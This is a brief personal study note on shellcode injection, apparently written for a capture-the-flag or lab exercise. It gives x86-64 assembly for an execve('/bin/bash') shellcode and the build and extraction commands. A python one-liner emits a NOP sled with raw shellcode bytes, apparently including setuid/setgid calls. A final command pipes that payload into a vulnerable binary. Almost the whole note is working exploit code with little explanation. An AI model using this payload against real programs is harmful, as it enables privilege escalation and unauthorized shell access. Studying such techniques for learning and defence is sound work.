# shellcode injection.

my first ever shellcode written in assembly:

```wasm
.global _start
_start:
.intel_syntax noprefix
  mov rax, 59 # syscall number of execve
  lea rdi, [rip+binsh] # points to binsh
  mov rsi, 0 # makes second argument , argv, NULL
  mov rdx, 0 # makes third argument, envp, NULL
  syscall
binsh:
  .string "/bin/bash"
```

we can then assemble the code

```bash
gcc -nostdlib -static shellcode.s -o shellcode.elf
```

```bash
objcopy --dump-section .text=shellcode-raw shellcode.elf
```

```bash
python -c "print('\x90'*880 + '\x48\x31\xff\x48\xc7\xc0\x69\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x6a\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00')" > shellcode
```

```bash
hexdump -v -e '"\\""x" 1/1 "%02x" ""' shellcode-raw
```

```bash
( cat ~/shellcode;cat ) | ./binary
```

### references.

- [https://gist.github.com/camargo/68f761533c249688b9596bf03253309a](https://www.notion.so/68f761533c249688b9596bf03253309a)
- [https://dhavalkapil.com/blogs/Shellcode-Injection/](https://dhavalkapil.com/blogs/Shellcode-Injection/)